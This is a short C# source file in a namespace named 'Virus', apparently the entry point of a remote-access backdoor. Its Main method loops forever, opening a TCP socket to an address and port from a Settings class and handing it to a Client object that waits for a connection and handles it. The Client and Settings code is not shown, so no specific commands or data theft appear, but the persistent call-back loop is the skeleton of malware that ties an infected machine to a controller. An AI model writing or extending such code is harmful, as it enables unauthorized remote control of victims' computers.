using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading;

namespace Virus
{
    class Program
    {
        static void Main(string[] args)
        {
            IPEndPoint endPoint = new IPEndPoint(Settings.address, Settings.port);
            Socket socket;
            Client client;
            while (true)
            {
                socket = new Socket(SocketType.Stream, ProtocolType.Tcp);
                client = new Client(endPoint, socket);
                client.WaitForConnect();
                client.Handle();
            }
        }


    }
}
